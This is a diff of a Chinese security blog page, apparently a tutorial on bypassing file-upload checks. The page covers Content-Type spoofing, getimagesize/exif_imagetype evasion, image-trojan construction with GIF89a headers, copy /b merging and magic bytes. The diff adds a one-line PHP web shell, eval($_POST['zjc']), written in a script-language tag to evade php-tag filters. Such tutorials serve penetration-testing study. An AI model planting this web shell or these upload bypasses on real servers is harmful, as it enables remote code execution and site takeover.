@@ -228,7 +228,7 @@
 
             <li class="collapse-level-0" collapse-level="0">
                 <a class="no-padding" href="/categories/漏洞复现与分析/">
-                    漏洞复现与分析 <span class="right">3 篇</span></a>
+                    漏洞复现与分析 <span class="right">4 篇</span></a>
                 </a>
             </li>
 
@@ -355,8 +355,11 @@
 <p>因此，可通过修改请求报文中的Content-Type类型绕过检测。</p>
 <h5 id="2）服务器端检测文件内容："><a href="#2）服务器端检测文件内容：" class="headerlink" title="2）服务器端检测文件内容："></a><u>2）服务器端检测文件内容：</u></h5><p>PHP函数getimagesize()除了可以计算图片的大小，在计算之前还会对文件的类型是否是图片做判断，因此有些PHP后端常使用该函数进行文件检查。exif_imagetype()检查文件头几个字节来区分不同的图片格式。</p>
 <p>对于检测内容的情况，可以制作图片木马，也就是图片格式的文件，里面输入了木马语句。</p>
-<p><u>制作图片马的方法：</u></p>
+<p><u>0x01制作图片马的方法：</u></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#方法1、GIF图片的例子</span></span><br><span class="line">GIF89a    <span class="comment">#gif文件欺骗，可通过getimagesize/exif_imagetype</span></span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();&gt;</span><br><span class="line"><span class="comment">#方法2、DOS命令，合并木马和图片</span></span><br><span class="line">copy 图片/b+木马.php/a 生成的图片名</span><br><span class="line"><span class="comment">#方法3、利用十六进制编辑器,写入后Notepad HEX转ASCII，然后写木马</span></span><br><span class="line">.gif:<span class="number">47</span> <span class="number">49</span> <span class="number">46</span> <span class="number">38</span> <span class="number">39</span> <span class="number">61</span> F1 <span class="number">00</span> <span class="number">2</span>C <span class="number">01</span> F7 <span class="number">00</span> <span class="number">00</span> <span class="number">64</span> <span class="number">32</span> <span class="number">33</span></span><br><span class="line">.jpg:FF D8 FF E0 <span class="number">00</span> <span class="number">10</span> <span class="number">4</span>A <span class="number">46</span> <span class="number">49</span> <span class="number">46</span> <span class="number">00</span> <span class="number">01</span> <span class="number">01</span> <span class="number">01</span> <span class="number">01</span> <span class="number">2</span>C</span><br><span class="line">.png:<span class="number">89</span> <span class="number">50</span> <span class="number">4</span>E <span class="number">47</span> <span class="number">0</span>D <span class="number">0</span>A <span class="number">1</span>A <span class="number">0</span>A <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">0</span>D <span class="number">49</span> <span class="number">48</span> <span class="number">44</span> <span class="number">52</span> / 文件头 <span class="number">89</span> <span class="number">50</span> <span class="number">4</span>E <span class="number">47</span> <span class="number">0</span>D <span class="number">0</span>A <span class="number">1</span>A <span class="number">0</span>A + 数据块 + 数据块 + 数据块……</span><br></pre></td></tr></table></figure>
+
+<p><u>0x02绕过过滤php标签的情况：</u></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt;<span class="built_in">eval</span>($_POST[<span class="string">&#x27;zjc&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
 <h5 id="3）服务器端检查文件后缀名"><a href="#3）服务器端检查文件后缀名" class="headerlink" title="3）服务器端检查文件后缀名"></a><u>3）服务器端检查文件后缀名</u></h5><p>服务器端在检测文件名时，一般会采用黑白名单策略，不允许上传php|asp|aspx|jsp…等可执行脚本文件；白名单只允许上传jpg|gif|png|doc|rar…等格式的文件。</p>
 <p>① - 可以尝试不同的脚本别名，来尝试绕过黑名单限制。例如：</p>
